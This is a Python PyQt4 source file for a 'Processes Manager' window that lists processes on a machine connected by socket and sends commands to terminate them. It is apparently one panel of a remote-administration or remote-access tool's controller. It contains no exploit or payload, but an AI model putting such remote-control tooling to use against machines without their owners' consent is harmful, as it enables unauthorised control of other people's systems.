from PyQt4.QtGui import *
from PyQt4.QtCore import *
from main_ui import Ui_Form
import ast
import os
import socket
import time

from libs.modechat import get, send

class mainPopup(QWidget, Ui_Form):
    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.sock = args['sock']
        self.socket = args['socket']
        self.ipAddress = args['ipAddress']
        self.assets = args['assets']

        self.gui = QApplication.processEvents

        self.setWindowTitle('Processes Manager - %s - Socket #%s' % (self.ipAddress, self.socket))
        self.setWindowIcon(QIcon(os.path.join(self.assets, 'processes.png')))

        self.get_processes_list()

        self.getProcessesButton.clicked.connect(self.get_processes_list)
        self.terminateProcessButton.clicked.connect(self.terminate_process)
        self.alwaysTopButton.clicked.connect(self.always_top)

    def get_processes_list(self):
        self.processesTable.clearContents()
        try:
            processes = get(self.sock, 'getProcessesList', 'getProcesses')
            processesDict = ast.literal_eval(processes)
            self.processesTable.setRowCount(len(processesDict))
            for index, pid in enumerate(processesDict):

                # Set PID
                item = QTableWidgetItem(str(pid))
                self.processesTable.setItem(index, 0, item)

                # Set Filename
                item = QTableWidgetItem(processesDict[pid])
                item.setIcon(QIcon(os.path.join(self.assets, 'executable.png')))
                self.processesTable.setItem(index, 1, item)

            self.processesCountLabel.setText(str(len(processesDict)))

        except AttributeError:
            pass
        except socket.error:
            pass

    def terminate_process(self):
        try:
            pid = self.processesTable.item(self.processesTable.currentRow(), 0).text()
            get(self.sock, 'terminateProcess %s' % pid, 'terminateProcess')
            time.sleep(1.0)
            self.get_processes_list()
        except AttributeError:
            pass

    def always_top(self):
        if self.alwaysTopButton.isChecked():
            self.setWindowFlags(self.windowFlags() | Qt.WindowStaysOnTopHint)
            self.show()
        else:
            self.setWindowFlags(self.windowFlags() & ~Qt.WindowStaysOnTopHint)
            self.show()

    def closeEvent(self, event):
        pass